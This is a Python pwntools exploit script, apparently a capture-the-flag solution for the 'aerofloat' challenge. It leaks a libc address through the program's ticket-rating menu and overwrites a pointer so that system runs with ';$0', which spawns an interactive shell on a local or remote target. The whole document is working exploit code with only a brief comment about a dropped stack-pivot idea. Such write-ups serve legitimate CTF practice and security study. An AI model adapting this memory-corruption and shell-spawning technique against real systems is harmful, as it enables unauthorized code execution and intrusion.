#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
# context.log_level = "debug"
if debug == 1:
    p = process('./aerofloat')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('tasks.aeroctf.com', 33017)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./aerofloat', checksec=False)


def add(set_idx, set_value):
    p.sendlineafter('> ', '1')
    p.sendafter('{?} Enter your ticket id: ', str(set_idx))
    p.sendlineafter('{?} Enter your rating: ', str(set_value))
    p.recvuntil('to ticket <')
    try:
        add_res = u64(p.recvuntil('>\n1')[:-3].ljust(8, '\x00'))
    except:
        add_res = 0xdeadbeef
    return add_res


addr_name = 0x4040C0
# 原本为栈迁移做准备，但是没法控制 rdx，所以转换了思路
offset = 5
pd = p64(0) * offset
pd += p32(0)
pd += p32(0x100)
p.sendlineafter('{?} Enter name: ', pd)
for i in range(11):
    ii = add('\x10', '+')
    success(str(i).rjust(2, '0') + ' = ' + hex(ii))
add(p64(0xfffffff300000000), '+')

addr_system = add('\x10', '+') - 0x194540
libcbase = addr_system - libc.sym['system']
libc_one_gadget = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]
addr_one_gadget = libcbase + libc_one_gadget[0]
add(p64(addr_name + 0x100), '+')
add(p64(addr_name + 0x100), '+')

for i in range(8):
    add(p64(addr_name + 0x100), '+')

add(p64(addr_name + 8 * (offset + 1)), '+')
# gdb.attach(p, 'b *0x4012ba\nb *0x401030\nb *0x4014bb\nc')
p.sendlineafter('> ', '1')
p.sendafter('{?} Enter your ticket id: ', p64(addr_system))
p.sendline(';$0')
p.recv()
success('addr_system     = ' + hex(addr_system))
success('addr_one_gadget = ' + hex(addr_one_gadget))
p.interactive()